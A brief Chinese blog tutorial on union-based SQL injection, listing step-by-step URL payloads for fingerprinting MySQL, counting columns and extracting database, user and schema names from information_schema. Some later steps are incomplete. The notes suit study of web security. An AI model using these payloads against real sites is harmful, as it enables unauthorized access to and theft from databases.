6.SQL注入(联合查询)
2021-03-12|SQL|
字数总计: 235|阅读时长: 1 分钟

前提

要用联合查询进行注入则：页面必须有显示位

联合查询

union可合并两个或多个select语句的结果集，
前提是两个select必有相同列、且各列的数据类型也相同

注入步骤

  1. 找注入点且得到闭合字符
  2. 判断数据库类型
    ?id=1”) and version()>0 –+返回正确，则可能是sqlserver和mysql
    ?id=1”) and length(user())>0 –+
    存在user函数，为mysql
  3. 猜解列数，得到显示位
    ?id=1’ order by 3 –+
    ?id=1’ order by 4 –+
    ?id=-1’ UNION SELECT 1,2,3 –+
  4. 得到基本信息(如：数据库名、数据库版本、当前数据库名等)
    ?id=-1’ UNION SELECT 1,concat_ws(“~”,database(),user(),version(),@@basedir),3 –+
  5. 得到数据库名
    ?id=-1’ UNION SELECT 1,count(distinct table_schema),3 from information_schema.tables –+
    ?id=-1’ UNION SELECT 1,count(distinct 1,table_schema),3 from information_schema.tables limit 4,1 –+
    依次得到数据库名
  6. 得到表名
    ?id=-1’ UNION SELECT 1,group_concat(table)
  7. 得到列名
  8. 得到列值
